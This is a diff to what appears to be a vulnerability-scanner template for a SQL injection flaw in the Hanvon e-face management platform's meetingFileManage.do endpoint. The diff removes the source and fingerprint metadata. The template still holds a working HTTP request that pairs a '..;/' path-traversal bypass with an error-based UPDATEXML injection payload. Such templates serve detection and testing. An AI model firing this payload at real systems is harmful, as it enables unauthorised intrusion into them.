@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 meetingFileManage.do 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sm6bgmqrgnm1xegi'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sm6bgmqrgnm1xegi
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'GET /manage/intercom/..;/..;/manage/meeting/meetingFileManage.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
